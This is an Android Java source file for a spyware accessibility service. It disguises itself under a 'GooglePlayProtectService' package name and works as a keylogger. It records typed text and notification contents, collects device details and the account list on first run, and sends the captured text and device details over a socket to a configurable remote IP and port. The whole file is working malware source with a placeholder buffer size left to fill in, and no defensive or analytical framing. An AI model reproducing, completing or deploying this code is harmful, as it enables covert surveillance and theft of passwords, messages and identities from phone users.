package com;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.GooglePlayProtectService.R;

import java.io.PrintWriter;
import java.net.Socket;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = MyAccessibilityService.class.getSimpleName();
    private static final int MAX_BUFFER_SIZE = Buffer-Send-Size-UpdateME;

    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            default:
                // Handle other event types if needed
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        // Handle text changed events
        List<CharSequence> textList = event.getText();
        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);

            if (newKeyEventCount > keyEventCount) {
                currentKeyEvents.append(newText.substring(keyEventCount));

                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendBufferToIPAndClear();
                }
            }

            keyEventCount = newKeyEventCount;
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        CharSequence notificationText = event.getText().toString();
        if (notificationText != null) {
            currentKeyEvents.append("Notification: ").append(notificationText).append("\n");

            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToIPAndClear();
            }
        }
    }

    private int countKeyEvents(String text) {
        // Count the number of key events (assuming each character is a key event)
        return text.length();
    }

    private void sendBufferToIPAndClear() {
        String log = currentKeyEvents.toString();
        new MessageSender().execute(log);
        currentKeyEvents.setLength(0); // Clear the builder
    }

    @Override
    public void onInterrupt() {
        // Handle interruption
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        // Check if it's the first run
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            // Gather accounts list
            String accountsList = getAccountsList();
            // Gather device details
            String deviceDetails = getSYSInfo();

            // Send the gathered information to the specified IP
            currentKeyEvents.append(deviceDetails).append("\n");
            sendBufferToIPAndClear();
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    private String getSYSInfo() {
        StringBuilder sysInfo = new StringBuilder();
        sysInfo.append("MANUFACTURER : ").append(Build.MANUFACTURER).append("\n");
        sysInfo.append("MODEL : ").append(Build.MODEL).append("\n");
        sysInfo.append("PRODUCT : ").append(Build.PRODUCT).append("\n");
        sysInfo.append("SERIAL : ").append(Build.SERIAL).append("\n");
        sysInfo.append("VERSION.RELEASE : ").append(Build.VERSION.RELEASE).append("\n");
        sysInfo.append("VERSION.INCREMENTAL : ").append(Build.VERSION.INCREMENTAL).append("\n");
        sysInfo.append("VERSION.SDK.NUMBER : ").append(Build.VERSION.SDK_INT).append("\n");
        sysInfo.append("BOARD : ").append(Build.BOARD).append("\n");
        return sysInfo.toString();
    }

    private String getAccountsList() {
        StringBuilder accountsList = new StringBuilder();
        AccountManager accountManager = AccountManager.get(this);
        Account[] accounts = accountManager.getAccounts();
        for (Account account : accounts) {
            accountsList.append(account.name).append("\n");
        }
        return accountsList.toString();
    }

    private class MessageSender extends AsyncTask<String, Void, Void> {
        private final String IP;
        private final int PORT;

        MessageSender() {
            IP = getResources().getString(R.string.ip_address);
            PORT = Integer.parseInt(getResources().getString(R.string.port_number));
        }

        @Override
        protected Void doInBackground(String... strings) {
            String message = strings[0];
            try {
                Socket socket = new Socket(IP, PORT);
                PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
                printWriter.write(message);

                printWriter.flush();
                printWriter.close();
                socket.close();
            } catch (Exception e) {
                e.printStackTrace();
            }
            return null;
        }
    }

}
